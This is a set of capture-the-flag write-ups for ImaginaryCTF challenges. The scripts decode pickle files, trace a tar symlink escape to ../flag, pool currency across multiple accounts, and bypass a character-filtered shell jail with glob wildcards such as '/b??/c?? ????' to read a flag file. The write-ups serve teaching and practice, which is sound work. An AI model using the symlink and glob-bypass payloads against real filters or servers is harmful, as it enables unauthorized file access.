# Pickle

## Description 

This pickle seems to be hiding the flag...

## Attachments

`https://imaginaryctf.org/f/1O5dx`

## Solution 

Python pickle module is used for serializing and de-serializing a Python object structure. Any object in Python can be pickled so that it can be saved on disk. What pickle does is that it “serializes” the object first before writing it to file. Pickling is a way to convert a python object (list, dict, etc.) into a character stream. The idea is that this character stream contains all the information necessary to reconstruct the object in another python script.

Here in this file there is class `FlagPrinter` in which the flag is stored in it's ASCII codes.

script

```
import pickle

f = open('out.pickle', 'rb')

class FlagPrinter:
    pass


db = pickle.load(f)
print(''.join(chr(x) for x in db.flag))

```

## flag

`ictf{cucumbers_or_pickles?}`

<br>

# Self Referencing

## Description

I recently learned that python lists can contain themselves. Here's a whole bunch of such lists - do they also contain a flag?

## Attachments

`https://imaginaryctf.org/f/LrX5f#out.pickle`

## Solution

The given pickle file contains a self referencing list.

The list contains a reference to itself. Here most of the lists just refer back to themselves, but some of them point to other lists in the bigger list. Tracing the indices of these lists through the loop gives the flag.

script

```
from pickle import load

chars = load(open('out.pickle', 'rb'))

start = chars[ord('i')]
lis = []

isFirst = True

while isFirst or start is not chars[ord('i')]:
    isFirst = False
    for i in range(128):
        if chars[i] is start:
            lis.append(i)
            break
    start = start[0]


print(''.join(chr(x) for x in lis))
```

## flag

`ictf{sphInx_oF-blaCk=qu@rTz~jUdge+my^v0w}`

<br>

# TARp

## Description

It helps to have a rain tarp when there's bad weather.

## Attachments

`https://imaginaryctf.org/f/tiUxj#server.py` 
`nc puzzler7.imaginaryctf.org 3005`

## Solution

The easiest that we can do here is to send a tar archive of symlink linking `../flag` so that when we try to read the file, it points to flag file.

## flag

`ictf{is_it_still_a_zip_slip_if_we_use_a_tar_file?}`

<br>

# Flag Market

## Description

Just buy the flag! Be warned, they can be kind of pricy... You might have to work with other people to get the money. Be warned, though ... as soon as someone finally buys the flag, the price goes right back up to max!

## Attachments

`http://puzzler7.imaginaryctf.org:4009`

## Solution

We earn around 10 rooCash from multiple accounts each and bringing down the price of the flag.

When we have enough rooCash, we buy the flag.

## flag

`ictf{purchased_with_blood_sweat_and_t3ars}`

<br>

# BC Jail

## Description

We've had some hard jail challenges(nameless & stackless). Time for some easy jail!

Note: The flag is the name of the flag file + the contents of this file. The flag filename is 22 characters long.

## Attachments

`nc puzzler7.imaginaryctf.org 4008`

## Solution

As we can see in source code there is filtering in the input which allows only `bc?/ ` characters.

Thankfully `?` character can used as alternate character in UNIX systems.

script

```
import socket


def netcat(hostname, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((hostname, port))
    data = (s.recv(1024)).decode()
    print(data)
    data = (s.recv(1024)).decode()
    print(data)

    payload = b'/b??/?c?? '
    payload += b'?' * 22
    s.send(payload + b'\n')
    data = s.recv(1024)
    print(data)

    payload = b'/b??/c?? ??????????????????????'
    s.send(payload + b'\n')
    s.recv(1024)
    data = s.recv(1024)
    print(data)


netcat('puzzler7.imaginaryctf.org', 4008)
```

## flag

`ictf{bre4k1ng_7he_j41l_like_4_b0ss!}`